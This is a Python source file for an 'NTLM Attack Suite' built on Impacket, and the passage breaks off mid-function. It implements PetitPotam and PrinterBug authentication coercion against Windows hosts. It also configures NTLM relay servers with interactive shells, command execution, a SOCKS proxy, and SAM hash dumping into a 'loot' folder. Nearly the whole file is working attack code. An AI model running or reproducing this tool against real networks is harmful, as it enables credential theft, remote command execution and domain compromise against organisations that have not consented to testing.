#!/usr/bin/env python3
import os
import sys
import re
import socket
import struct
import time
import threading
import queue
import base64
import signal
import traceback
import logging
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from enum import Enum

from colorama import Fore, Style, init

# ============================================================
# Impacket Core Imports (Direct API)
# ============================================================
try:
    from impacket import version as impacket_version
    from impacket.dcerpc.v5 import transport, rprn, scmr
    from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT, NDRPOINTER, NDRUNION
    from impacket.dcerpc.v5.dtypes import WSTR, DWORD, NULL, ULONG, BOOL, UCHAR, PBYTE, LPWSTR, RPC_SID, PCHAR
    from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
    from impacket.uuid import uuidtup_to_bin
    from impacket.smbconnection import SMBConnection
    from impacket.smb import SMB_DIALECT
    from impacket.ntlm import compute_lmhash, compute_nthash
    from impacket.spnego import SPNEGO_NegTokenInit, TypesMech

    # NTLM RelayX imports
    from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
    from impacket.examples.ntlmrelayx.servers import SMBRelayServer, HTTPRelayServer
    from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor, TargetsFileWatcher
    from impacket.examples.ntlmrelayx.attacks import PROTOCOL_ATTACKS
    from impacket.examples.ntlmrelayx.clients import PROTOCOL_CLIENTS
    from impacket.examples.ntlmrelayx.servers.socksserver import SOCKS

except ImportError as e:
    print(Fore.RED + f"[!] Impacket import error: {e}" + Style.RESET_ALL)
    print(Fore.YELLOW + "Please install impacket: python -m pip install impacket" + Style.RESET_ALL)
    sys.exit(1)

init(autoreset=True)

# ============================================================
# Logging Setup
# ============================================================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger('JokerTicket')

# ============================================================
# Data Classes
# ============================================================

@dataclass
class CapturedSession:
    """Represents a captured NTLM session"""
    timestamp: datetime
    source_ip: str
    username: str
    domain: str
    target_protocol: str
    ntlm_hash: bytes
    relay_status: str = "pending"

    def __str__(self):
        return f"[{self.timestamp.strftime('%H:%M:%S')}] {self.domain}\\{self.username} from {self.source_ip} ({self.relay_status})"

@dataclass
class RelayTarget:
    """Represents a relay target"""
    protocol: str  # smb, ldap, ldaps, adcs, mssql
    host: str
    port: int = None
    command: str = None
    dump_hashes: bool = False

class CoercionMethod(Enum):
    OPEN_FILE_RAW = "EfsRpcOpenFileRaw"
    ENCRYPT_FILE_SRV = "EfsRpcEncryptFileSrv"
    DECRYPT_FILE_SRV = "EfsRpcDecryptFileSrv"

# ============================================================
# MS-EFSRPC Structures (Original PetitPotam Logic)
# ============================================================

class EXIMPORT_CONTEXT_HANDLE(NDRSTRUCT):
    align = 1
    structure = (('Data', '20s'),)

class EFS_EXIM_PIPE(NDRSTRUCT):
    align = 1
    structure = (('Data', ':'),)

class EFS_HASH_BLOB(NDRSTRUCT):
    structure = (
        ('Data', DWORD),
        ('cbData', PCHAR),
    )

class EFS_RPC_BLOB(NDRSTRUCT):
    structure = (
        ('Data', DWORD),
        ('cbData', PCHAR),
    )

class EFS_CERTIFICATE_BLOB(NDRSTRUCT):
    structure = (
        ('Type', DWORD),
        ('Data', DWORD),
        ('cbData', PCHAR),
    )

class ENCRYPTION_CERTIFICATE_HASH(NDRSTRUCT):
    structure = (
        ('Lenght', DWORD),
        ('SID', RPC_SID),
        ('Hash', EFS_HASH_BLOB),
        ('Display', LPWSTR),
    )

class ENCRYPTION_CERTIFICATE(NDRSTRUCT):
    structure = (
        ('Lenght', DWORD),
        ('SID', RPC_SID),
        ('Hash', EFS_CERTIFICATE_BLOB),
    )

class ENCRYPTION_CERTIFICATE_HASH_LIST(NDRSTRUCT):
    align = 1
    structure = (
        ('Cert', DWORD),
        ('Users', ENCRYPTION_CERTIFICATE_HASH),
    )

class ENCRYPTION_CERTIFICATE_LIST(NDRSTRUCT):
    align = 1
    structure = (('Data', ':'),)

class ENCRYPTED_FILE_METADATA_SIGNATURE(NDRSTRUCT):
    structure = (
        ('Type', DWORD),
        ('HASH', ENCRYPTION_CERTIFICATE_HASH_LIST),
        ('Certif', ENCRYPTION_CERTIFICATE),
        ('Blob', EFS_RPC_BLOB),
    )

# ============================================================
# RPC Calls for PetitPotam (Original Logic)
# ============================================================

class EfsRpcOpenFileRaw(NDRCALL):
    opnum = 0
    structure = (
        ('fileName', WSTR),
        ('Flag', ULONG),
    )

class EfsRpcOpenFileRawResponse(NDRCALL):
    structure = (
        ('hContext', EXIMPORT_CONTEXT_HANDLE),
        ('ErrorCode', ULONG),
    )

class EfsRpcEncryptFileSrv(NDRCALL):
    opnum = 4
    structure = (
        ('FileName', WSTR),
    )

class EfsRpcEncryptFileSrvResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )

class EfsRpcDecryptFileSrv(NDRCALL):
    opnum = 5
    structure = (
        ('FileName', WSTR),
        ('Flag', ULONG),
    )

class EfsRpcDecryptFileSrvResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )

class EfsRpcAddUsersToFile(NDRCALL):
    opnum = 9
    structure = (
        ('FileName', WSTR),
        ('EncryptionCertificates', ENCRYPTION_CERTIFICATE_LIST),
    )

class EfsRpcAddUsersToFileResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )

class EfsRpcDuplicateEncryptionInfoFile(NDRCALL):
    opnum = 13
    structure = (
        ('SrcFileName', WSTR),
        ('DestFileName', WSTR),
        ('dwCreationDisposition', DWORD),
        ('dwAttributes', DWORD),
        ('RelativeSD', EFS_RPC_BLOB),
        ('bInheritHandle', BOOL),
    )

class EfsRpcDuplicateEncryptionInfoFileResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )

class EfsRpcEncryptFileExSrv(NDRCALL):
    opnum = 21
    structure = (
        ('FileName', WSTR),
        ('ProtectorDescriptor', WSTR),
        ('Flags', ULONG),
    )

class EfsRpcEncryptFileExSrvResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )

# ============================================================
# Native Coercion Engine (Original PetitPotam + PrinterBug Logic)
# ============================================================

class CoerceAuthEngine:
    """Native coercion using direct Impacket API calls - Original Tools Logic"""

    # Available named pipes for coercion (from original PetitPotam)
    NAMED_PIPES = {
        'lsarpc': {
            'stringBinding': r'ncacn_np:%s[\PIPE\lsarpc]',
            'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
        },
        'efsrpc': {
            'stringBinding': r'ncacn_np:%s[\PIPE\efsrpc]',
            'MSRPC_UUID_EFSR': ('df1941c5-fe89-4e79-bf10-463657acf44d', '1.0')
        },
        'samr': {
            'stringBinding': r'ncacn_np:%s[\PIPE\samr]',
            'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
        },
        'lsass': {
            'stringBinding': r'ncacn_np:%s[\PIPE\lsass]',
            'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
        },
        'netlogon': {
            'stringBinding': r'ncacn_np:%s[\PIPE\netlogon]',
            'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
        },
    }

    def __init__(self, username: str = '', password: str = '', domain: str = '',
                 lmhash: str = '', nthash: str = ''):
        self.username = username
        self.password = password
        self.domain = domain
        self.lmhash = lmhash
        self.nthash = nthash
        self.use_kerberos = False
        self.dc_host = ''
        self.target_ip = ''

    def set_kerberos(self, enable: bool, dc_host: str = ''):
        self.use_kerberos = enable
        self.dc_host = dc_host

    def set_target_ip(self, ip: str):
        self.target_ip = ip

    def _connect_and_bind(self, target: str, pipe: str) -> Any:
        """Establish DCE/RPC connection and bind to EFS - Original PetitPotam Logic"""
        if pipe not in self.NAMED_PIPES:
            raise Exception(f"Unknown pipe: {pipe}")

        binding = self.NAMED_PIPES[pipe]
        stringbinding = binding['stringBinding'] % target

        rpctransport = transport.DCERPCTransportFactory(stringbinding)

        if self.target_ip:
            rpctransport.setRemoteHost(self.target_ip)

        if hasattr(rpctransport, 'set_credentials') and self.username:
            rpctransport.set_credentials(self.username, self.password, self.domain, 
                                         self.lmhash, self.nthash)

        if self.use_kerberos and self.dc_host:
            rpctransport.set_kerberos(True, kdcHost=self.dc_host)

        dce = rpctransport.get_dce_rpc()
        dce.set_auth_type(RPC_C_AUTHN_WINNT)
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)

        print_status(f"Connecting to {stringbinding}", "info")
        try:
            dce.connect()
        except Exception as e:
            raise Exception(f"Connection failed: {str(e)}")

        print_status(f"Binding to {binding['MSRPC_UUID_EFSR'][0]}", "info")
        try:
            dce.bind(uuidtup_to_bin(binding['MSRPC_UUID_EFSR']))
        except Exception as e:
            raise Exception(f"Bind failed: {str(e)}")

        print_status("Successfully bound!", "good")
        return dce

    def _send_petitpotam_request(self, dce: Any, listener: str, method: CoercionMethod) -> Tuple[bool, str]:
        """Send coercion request using specified method - Original PetitPotam Logic"""
        try:
            if method == CoercionMethod.OPEN_FILE_RAW:
                print_status("Sending EfsRpcOpenFileRaw!", "info")
                request = EfsRpcOpenFileRaw()
                request['fileName'] = '\\\\%s\\test\\Settings.ini\x00' % listener
                request['Flag'] = 0
                dce.request(request)

            elif method == CoercionMethod.ENCRYPT_FILE_SRV:
                print_status("Sending EfsRpcEncryptFileSrv!", "info")
                request = EfsRpcEncryptFileSrv()
                request['FileName'] = '\\\\%s\\test\\Settings.ini\x00' % listener
                dce.request(request)

            elif method == CoercionMethod.DECRYPT_FILE_SRV:
                print_status("Sending EfsRpcDecryptFileSrv!", "info")
                request = EfsRpcDecryptFileSrv()
                request['FileName'] = '\\\\%s\\test\\Settings.ini\x00' % listener
                request['Flag'] = 0
                dce.request(request)

            return True, "Request sent"

        except DCERPCException as e:
            error_str = str(e)
            if 'ERROR_BAD_NETPATH' in error_str:
                # Expected error - attack worked!
                return True, "Got expected ERROR_BAD_NETPATH - Attack worked!"
            elif 'rpc_s_access_denied' in error_str.lower():
                return False, "RPC_ACCESS_DENIED - Function probably patched"
            else:
                return False, f"DCE/RPC Error: {error_str}"
        except Exception as e:
            return False, str(e)

    def coerce_petitpotam(self, listener_ip: str, target_ip: str, 
                          use_fallback: bool = True, pipe_choice: str = 'all') -> Tuple[bool, str]:
        """
        Execute PetitPotam coercion using original tool logic

        Args:
            listener_ip: IP where relay server is listening
            target_ip: Target machine to coerce
            use_fallback: Try alternative methods if primary fails
            pipe_choice: Which pipe to use ('all' or specific pipe name)

        Returns:
            (success, details)
        """
        print_status(f"Starting PetitPotam coercion: {target_ip} -> {listener_ip}", "info")

        if pipe_choice == "all":
            pipes_to_try = list(self.NAMED_PIPES.keys())
        else:
            pipes_to_try = [pipe_choice] if pipe_choice in self.NAMED_PIPES else []
            if not pipes_to_try:
                return False, f"Invalid pipe: {pipe_choice}"

        methods_to_try = [CoercionMethod.OPEN_FILE_RAW]
        if use_fallback:
            methods_to_try.extend([CoercionMethod.ENCRYPT_FILE_SRV, CoercionMethod.DECRYPT_FILE_SRV])

        for pipe in pipes_to_try:
            print_status(f"Trying pipe: {pipe}", "info")

            try:
                dce = self._connect_and_bind(target_ip, pipe)
            except Exception as e:
                print_status(f"  Failed to connect/bind: {str(e)[:60]}", "warning")
                continue

            for method in methods_to_try:
                success, message = self._send_petitpotam_request(dce, listener_ip, method)

                if success and "Attack worked" in message:
                    dce.disconnect()
                    print_status(f"SUCCESS: {method.value} on {pipe}", "good")
                    return True, f"Coerced using {method.value} on {pipe}"
                elif "RPC_ACCESS_DENIED" in message and method == CoercionMethod.OPEN_FILE_RAW:
                    print_status(f"  {message}, trying fallback...", "warning")
                    continue
                elif not success:
                    print_status(f"  {method.value} failed: {message[:50]}", "warning")
                    continue

            dce.disconnect()

        return False, "All pipes and methods exhausted"

    def coerce_printerbug(self, listener_ip: str, target_ip: str, port: int = 445) -> Tuple[bool, str]:
        """
        Execute PrinterBug coercion using original MS-RPRN logic

        Args:
            listener_ip: IP where relay server is listening
            target_ip: Target machine to coerce
            port: SMB port (139 or 445)

        Returns:
            (success, details)
        """
        print_status(f"Starting PrinterBug coercion: {target_ip} -> {listener_ip}", "info")

        # TCP Ping check (from original printerbug.py)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target_ip, port))
            s.close()
            print_status(f"Host is up on port {port}", "good")
        except:
            print_status(f"Host seems offline on port {port}, trying anyway...", "warning")

        stringbinding = r'ncacn_np:%s[\PIPE\spoolss]' % target_ip
        rpctransport = transport.DCERPCTransportFactory(stringbinding)
        rpctransport.set_dport(port)

        if self.target_ip:
            rpctransport.setRemoteHost(self.target_ip)

        if hasattr(rpctransport, 'set_credentials') and self.username:
            rpctransport.set_credentials(self.username, self.password, self.domain,
                                         self.lmhash, self.nthash)

        if self.use_kerberos and self.dc_host:
            rpctransport.set_kerberos(True, kdcHost=self.dc_host)

        try:
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(rprn.MSRPC_UUID_RPRN)
            print_status("Bind OK", "good")

            # Open printer handle (from original printerbug.py)
            try:
                resp = rprn.hRpcOpenPrinter(dce, '\\\\%s\x00' % target_ip)
            except Exception as e:
                if 'Broken pipe' in str(e):
                    return False, "Connection failed - skipping host"
                elif 'ACCESS_DENIED' in str(e).upper():
                    return False, "Access denied - RPC call was denied"
                else:
                    raise

            print_status("Got handle", "good")

            # Send notification request (from original printerbug.py)
            request = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
            request['hPrinter'] = resp['pHandle']
            request['fdwFlags'] = rprn.PRINTER_CHANGE_ADD_JOB
            request['pszLocalMachine'] = '\\\\%s\x00' % listener_ip
            request['pOptions'] = NULL

            try:
                dce.request(request)
            except Exception as e:
                # Expected behavior in most cases
                pass

            dce.disconnect()
            print_status(f"PrinterBug triggered successfully on port {port}", "good")
            return True, f"Coerced using PrinterBug on port {port}"

        except Exception as e:
            error_str = str(e)
            if 'rpc_s_access_denied' in error_str.lower():
                return False, "Access denied on port {port}"
            else:
                return False, f"Port {port} failed: {error_str[:60]}"

# ============================================================
# Native Relay Engine (Original NTLMRelayX Logic)
# ============================================================

class RelaySessionManager:
    """Manages relay sessions with original Impacket NTLMRelayX API"""

    def __init__(self):
        self.active_sessions: List[CapturedSession] = []
        self.relay_servers: List[Any] = []
        self.socks_server = None
        self.config = None
        self.running = False
        self.session_queue = queue.Queue()
        self.relay_success_count = 0
        self.relay_failure_count = 0
        self.threads = set()
        self.dump_hashes_enabled = False

    def dump_sam_hashes(self, client, session: CapturedSession) -> bool:
        """Manual SAM hash dump using SMBConnection"""
        if not self.dump_hashes_enabled:
            return False

        try:
            from impacket.examples.secretsdump import RemoteOperations, SAMHashes
            from impacket.smbconnection import SMBConnection

            print_status(f"Attempting SAM dump from {session.source_ip}...", "info")

            # Use the relayed connection
            smb = client
            if hasattr(client, 'getSMBServer'):
                smb = client.getSMBServer()

            # Try to dump SAM
            remote_ops = RemoteOperations(smb, False)
            remote_ops.enableRegistry()

            if remote_ops._RemoteOperations__rrp:
                sam_hashes = SAMHashes(remote_ops._RemoteOperations__rrp, smb)
                sam_hashes.dump()

                # Save to file
                loot_dir = './loot'
                filename = f"{session.source_ip}.sam"
                filepath = os.path.join(loot_dir, filename)

                with open(filepath, 'w') as f:
                    for user, hash_data in sam_hashes.getHashes().items():
                        f.write(f"{user}:{hash_data}")

                print_status(f"SAM hashes saved to {filepath}", "good")

                # Display in terminal
                print(Fore.YELLOW + "\n[EXTRACTED SAM HASHES]" + Style.RESET_ALL)
                for user, hash_data in sam_hashes.getHashes().items():
                    print(Fore.YELLOW + f"  {user}:{hash_data}" + Style.RESET_ALL)

                remote_ops.finish()
                return True
            else:
                print_status("Registry access failed - SAM dump skipped", "warning")
                return False

        except Exception as e:
            print_status(f"SAM dump failed: {str(e)[:80]}", "warning")
            return False

    def setup_config(self, bind_ip: str, targets: List[RelayTarget], 
                     enable_socks: bool = False, socks_port: int = 1080,
                     enable_smb: bool = True, enable_http: bool = True,
                     command: str = None, dump_hashes: bool = False,
                     smb2support: bool = True) -> NTLMRelayxConfig:
        """Setup NTLMRelayx configuration using original API logic - FULL CONFIG"""

        # Create loot directory if it doesn't exist
        loot_dir = './loot'
        if not os.path.exists(loot_dir):
            try:
                os.makedirs(loot_dir)
                print_status(f"Created loot directory: {loot_dir}", "good")
            except Exception as e:
                print_status(f"Failed to create loot dir: {e}", "warning")
                loot_dir = '.'

        config = NTLMRelayxConfig()

        # Set protocol clients and attacks (from original ntlmrelayx)
        config.setProtocolClients(PROTOCOL_CLIENTS)
        config.setAttacks(PROTOCOL_ATTACKS)

        # Set targets using TargetsProcessor (from original ntlmrelayx)
        target_strings = []
        for t in targets:
            if t.port:
                target_strings.append(f"{t.protocol}://{t.host}:{t.port}")
            else:
                target_strings.append(f"{t.protocol}://{t.host}")

        # Create single target string or use first target for single mode
        if len(target_strings) == 1:
            targetSystem = TargetsProcessor(singleTarget=target_strings[0], protocolClients=PROTOCOL_CLIENTS)
        else:
            # For multiple targets, use first as primary
            targetSystem = TargetsProcessor(singleTarget=target_strings[0], protocolClients=PROTOCOL_CLIENTS)
            if len(target_strings) > 1:
                print_status(f"Multiple targets detected, using primary: {target_strings[0]}", "warning")

        config.setTargets(targetSystem)

        # === CRITICAL: Set ALL config options that attacks expect ===
        # SMB options (fixes addComputerSMB AttributeError)
        config.setAddComputerSMB(None)  # None = disabled
        config.setEnumLocalAdmins(False)
        config.setDisableMulti(False)
        config.setKeepRelaying(True)
        config.setEncoding('utf-8')
        config.setMode('RELAY')
        config.setLootdir(loot_dir)
        self.dump_hashes_enabled = dump_hashes
        config.setOutputFile(None)
        config.setdumpHashes(dump_hashes)
        config.setSMB2Support(smb2support)
        config.setSMBChallenge(None)
        config.setSMBRPCAttack(None)
        config.setInterfaceIp(bind_ip)
        config.setExploitOptions(False, False, False)  # remove_mic, remove_target, remove_sign_seal
        config.setWebDAVOptions(None)

        # Command execution
        if command:
            config.setCommand(command)
        else:
            config.setCommand(None)
        config.setExeFile(None)

        # LDAP options - POSITIONAL arguments (not keyword!)
        # setLDAPOptions(no_dump, no_da, no_acl, no_validate_privs, escalate_user, 
        #                add_computer, delegate_access, dump_laps, dump_gmsa, dump_adcs, sid, add_dns_record)
        config.setLDAPOptions(
            False,      # no_dump (False = do dump)
            False,      # no_da (False = do add DA)
            False,      # no_acl (False = do ACL attacks)
            False,      # no_validate_privs
            None,       # escalate_user
            None,       # add_computer
            False,      # delegate_access
            False,      # dump_laps
            False,      # dump_gmsa
            False,      # dump_adcs
            False,      # sid
            None        # add_dns_record
        )

        # RPC options - POSITIONAL arguments
        # setRPCOptions(rpc_mode, rpc_use_smb, auth_smb, hashes_smb, rpc_smb_port, icpr_ca_name)
        config.setRPCOptions('TSCH', False, '', None, 445, '')

        # MSSQL options - POSITIONAL
        config.setMSSQLOptions(None)

        # Interactive mode vs SAM dump
        # If dump_hashes enabled, disable interactive to allow secretsdump
        if dump_hashes:
            config.setInteractive(False)
            print_status("SAM dump enabled - interactive mode disabled", "info")
        else:
            config.setInteractive(True)
            print_status("Interactive mode enabled - shells on 127.0.0.1:11000+", "info")

        # IMAP options - POSITIONAL
        # setIMAPOptions(keyword, mailbox, all, imap_max)
        config.setIMAPOptions('password', 'INBOX', False, 0)

        # IPv6
        config.setIPv6(False)

        # WPAD options - POSITIONAL
        # setWpadOptions(wpad_host, wpad_auth_num)
        config.setWpadOptions(None, 1)

        # ADCS options
        config.setIsADCSAttack(False)
        config.setADCSOptions(None)
        config.setAltName(None)

        # Shadow Credentials - POSITIONAL
        # setShadowCredentialsOptions(shadow_target, pfx_password, export_type, cert_outfile_path)
        config.setIsShadowCredentialsAttack(False)
        config.setShadowCredentialsOptions(None, None, 'PFX', None)

        # SCCM options - POSITIONAL
        # setSCCMPoliciesOptions(sccm_policies_clientname, sccm_policies_sleep)
        config.setIsSCCMPoliciesAttack(False)
        config.setIsSCCMDPAttack(False)
        config.setSCCMPoliciesOptions(None, None)
        # setSCCMDPOptions(sccm_dp_extensions, sccm_dp_files)
        config.setSCCMDPOptions(None, None)

        # SOCKS proxy
        if enable_socks:
            socksServer = SOCKS(server_address=(bind_ip, socks_port))
            socksServer.daemon_threads = True
            config.setRunSocks(True, socksServer)
            self.socks_server = socksServer
        else:
            config.setRunSocks(False, None)

        self.config = config
        return config

    def start_servers(self, bind_ip: str, smb_port: int = 445, http_port: int = 80,
                      enable_smb: bool = True, enable_http: bool = True) -> bool:
        """Start relay servers using original Impacket API"""

        if not self.config:
            print_status("Config not initialized! Call setup_config first.", "error")
            return False

        # Check if ports are already in use
        import errno
        for port, name in [(smb_port, 'SMB'), (http_port, 'HTTP')]:
            test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                test_sock.bind((bind_ip, port))
                test_sock.close()
            except OSError as e:
                if e.errno == errno.EADDRINUSE:
                    print_status(f"Port {port} ({name}) is already in use!", "error")
                    print_status(f"Attempting to kill process on port {port}...", "warning")
                    try:
                        import subprocess
                        # Find and kill process on port
                        result = subprocess.run(['sudo', 'lsof', '-t', f'-i:{port}'], 
                                              capture_output=True, text=True)
                        if result.returncode == 0 and result.stdout.strip():
                            pids = result.stdout.strip().split('')
                            for pid in pids:
                                if pid:
                                    try:
                                        os.kill(int(pid), 9)
                                        print_status(f"Killed PID {pid} on port {port}", "good")
                                    except:
                                        pass
                            # Wait a moment and retry
                            time.sleep(1)
                            test_sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            try:
                                test_sock2.bind((bind_ip, port))
                                test_sock2.close()
                                print_status(f"Port {port} is now free!", "good")
                                continue
                            except:
                                pass
                    except Exception as kill_err:
                        print_status(f"Auto-kill failed: {kill_err}", "warning")

                    print_status(f"Run manually: sudo lsof -i :{port}  or  sudo kill $(sudo lsof -t -i:{port})", "warning")
                    return False

        # SAM dump will work automatically when interactive=False and dumpHashes=True
        # No monkey-patching needed - let Impacket handle it natively

        servers_started = 0

        try:
            if enable_smb:
                # SMB server uses its own config copy, set port before instantiation
                self.config.setListeningPort(smb_port)
                smb_server = SMBRelayServer(self.config)
                smb_server.start()
                self.relay_servers.append(smb_server)
                self.threads.add(smb_server)
                servers_started += 1
                print_status(f"SMB Relay Server started on {bind_ip}:{smb_port}", "good")

            if enable_http:
                # HTTP server needs fresh config or different port handling
                # Create new config for HTTP to avoid port conflict with SMB config
                http_config = NTLMRelayxConfig()
                # Copy essential settings
                http_config.setProtocolClients(PROTOCOL_CLIENTS)
                http_config.setAttacks(PROTOCOL_ATTACKS)
                http_config.setTargets(self.config.target)
                http_config.setRunSocks(False, None)
                http_config.setSMB2Support(self.config.smb2support)
                http_config.setCommand(getattr(self.config, 'command', None))
                http_config.setdumpHashes(getattr(self.config, 'dumpHashes', False))
                http_config.setInterfaceIp(bind_ip)
                http_config.setLootdir('./loot')
                http_config.setMode('RELAY')
                http_config.setKeepRelaying(True)
                http_config.setListeningPort(http_port)
                # Copy other critical attributes
                http_config.setAddComputerSMB(getattr(self.config, 'addComputerSMB', None))
                http_config.setEnumLocalAdmins(getattr(self.config, 'enumLocalAdmins', False))
                http_config.setDisableMulti(getattr(self.config, 'disableMulti', False))
                http_config.setEncoding(getattr(self.config, 'encoding', 'utf-8'))
                http_config.setSMBChallenge(getattr(self.config, 'SMBChallenge', None))
                http_config.setSMBRPCAttack(getattr(self.config, 'rpc_attack', None))
                http_config.setExploitOptions(False, False, False)
                http_config.setWebDAVOptions(None)
                http_config.setLDAPOptions(
                    False, False, False, False, None, None, False, False, False, False, False, None
                )
                http_config.setRPCOptions('TSCH', False, '', None, 445, '')
                http_config.setMSSQLOptions(None)
                http_config.setInteractive(True)
                http_config.setIMAPOptions('password', 'INBOX', False, 0)
                http_config.setIPv6(False)
                http_config.setWpadOptions(None, 1)
                http_config.setIsADCSAttack(False)
                http_config.setADCSOptions(None)
                http_config.setAltName(None)
                http_config.setIsShadowCredentialsAttack(False)
                http_config.setShadowCredentialsOptions(None, None, 'PFX', None)
                http_config.setIsSCCMPoliciesAttack(False)
                http_config.setIsSCCMDPAttack(False)
                http_config.setSCCMPoliciesOptions(None, None)
                http_config.setSCCMDPOptions(None, None)

                http_server = HTTPRelayServer(http_config)
                http_server.start()
                self.relay_servers.append(http_server)
                self.threads.add(http_server)
                servers_started += 1
                print_status(f"HTTP Relay Server started on {bind_ip}:{http_port}", "good")

        except Exception as e:
            print_status(f"Failed to start relay server: {e}", "error")
            traceback.print_exc()
            return False

        self.running = True
        return servers_started > 0

    def stop_servers(self):
        """Stop all relay servers"""
        self.running = False
        for server in self.relay_servers:
            try:
                if hasattr(server, 'server') and hasattr(server.server, 'shutdown'):
                    server.server.shutdown()
                elif hasattr(server, 'shutdown'):
                    server.shutdown()
            except Exception as e:
                print_status(f"Error stopping server: {e}", "warning")

        if self.socks_server:
            try:
                self.socks_server.shutdown()
            except:
                pass

        self.relay_servers.clear()
        self.threads.clear()
        print_status("All relay servers stopped", "info")

    def get_sessions(self) -> List[CapturedSession]:
        """Get all captured sessions"""
        return self.active_sessions

    def get_pending_sessions(self) -> List[CapturedSession]:
        """Get sessions pending relay"""
        return [s for s in self.active_sessions if s.relay_status == "pending"]

    def get_stats(self) -> Dict:
        """Get relay statistics"""
        return {
            'total_sessions': len(self.active_sessions),
            'successful_relays': self.relay_success_count,
            'failed_relays': self.relay_failure_count,
            'active_servers': len(self.relay_servers)
        }

# ============================================================
# WebDAV Path Parser
# ============================================================

@dataclass
class WebDAVTarget:
    """Parsed WebDAV target"""
    host: str
    port: int = 80
    path: str = "/"
    use_https: bool = False

    @classmethod
    def parse(cls, target_str: str) -> Optional['WebDAVTarget']:
        """
        Parse WebDAV target format:
        - 192.168.x.x
        - 192.168.x.x:8080
        - 192.168.x.x@80/test
        - https://192.168.x.x/test
        """
        target_str = target_str.strip()

        # Check for HTTPS
        use_https = False
        if target_str.startswith('https://'):
            use_https = True
            target_str = target_str[8:]
        elif target_str.startswith('http://'):
            target_str = target_str[7:]

        # Parse host@port/path format
        host = target_str
        port = 443 if use_https else 80
        path = "/"

        if '@' in target_str:
            # Format: host@port/path
            host_part, rest = target_str.split('@', 1)
            host = host_part

            if '/' in rest:
                port_str, path = rest.split('/', 1)
                path = '/' + path
            else:
                port_str = rest
                path = '/'

            try:
                port = int(port_str)
            except ValueError:
                pass
        else:
            # Standard format
            if ':' in host:
                host, port_str = host.split(':', 1)
                try:
                    port = int(port_str)
                except ValueError:
                    pass

            if '/' in host:
                host, path = host.split('/', 1)
                path = '/' + path

        return cls(host=host, port=port, path=path, use_https=use_https)

    def get_url(self) -> str:
        """Get full URL"""
        scheme = 'https' if self.use_https else 'http'
        return f"{scheme}://{self.host}:{self.port}{self.path}"

    def get_unc_path(self) -> str:
        """Get UNC path for coercion"""
        return f"\\\\{self.host}@{self.port}\\{self.path.lstrip('/').replace('/', '\\')}"

# ============================================================
# UI and Main Menu (Preserved Original Style)
# ============================================================

def get_impacket_version():
    """Get impacket version safely"""
    try:
        if hasattr(impacket_version, 'get_version'):
            try:
                return impacket_version.get_version('impacket')
            except TypeError:
                try:
                    return impacket_version.get_version()
                except:
                    pass

        if hasattr(impacket_version, 'version'):
            return impacket_version.version

        if hasattr(impacket_version, '__version__'):
            return impacket_version.__version__

        return "Unknown"
    except:
        return "Unknown"

def banner():
    print(Fore.CYAN + """
    ╔═══════════════════════════════════════════════════════════════════════╗
    ║                            NTLM Attack Suite                          ║
    ║                                                                       ║
    ║  [1] Relay Server (Direct NTLMRelayX API)                             ║
    ║  [2] PetitPotam Coercion (Multi-pipe, Multi-method)                   ║
    ║  [3] PrinterBug Coercion (Spooler check + dual port)                  ║
    ║  [4] Shadow Coercion (MS-FSRVP alternative)                           ║
    ║  [5] WebDAV Relay Helper                                              ║
    ║  [6] Session Manager                                                  ║
    ║  [7] Exit                                                             ║
    ╚═══════════════════════════════════════════════════════════════════════╝
    """ + Style.RESET_ALL)
    print(Fore.YELLOW + f"Impacket Version: {get_impacket_version()}" + Style.RESET_ALL)

def print_status(msg, level="info"):
    timestamp = datetime.now().strftime("%H:%M:%S")
    if level == "info":
        print(Fore.WHITE + f"[{timestamp}] [*] {msg}" + Style.RESET_ALL)
    elif level == "good":
        print(Fore.GREEN + f"[{timestamp}] [+] {msg}" + Style.RESET_ALL)
    elif level == "error":
        print(Fore.RED + f"[{timestamp}] [!] {msg}" + Style.RESET_ALL)
    elif level == "warning":
        print(Fore.YELLOW + f"[{timestamp}] [W] {msg}" + Style.RESET_ALL)

def validate_ip(ip):
    if not ip:
        return False
    pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
    if not re.match(pattern, ip):
        return False
    return all(0 <= int(p) <= 255 for p in ip.split('.'))

def get_input(prompt, validator=None, error_msg="Invalid input!", allow_empty=False, password=False):
    while True:
        try:
            if password:
                import getpass
                value = getpass.getpass(prompt).strip()
            else:
                value = input(prompt).strip()

            if value.lower() in ['back', 'exit', 'quit']:
                return None

            if not value:
                if allow_empty:
                    return ''
                print(Fore.RED + "Value cannot be empty!" + Style.RESET_ALL)
                continue

            if validator and not validator(value):
                print(Fore.RED + error_msg + Style.RESET_ALL)
                continue

            return value
        except (KeyboardInterrupt, EOFError):
            return None

def get_all_ips():
    ips = []
    try:
        for line in os.popen("ip addr show 2>/dev/null || ifconfig 2>/dev/null").read().split('\n'):
            m = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', line)
            if m and m.group(1) != '127.0.0.1' and m.group(1) not in ips:
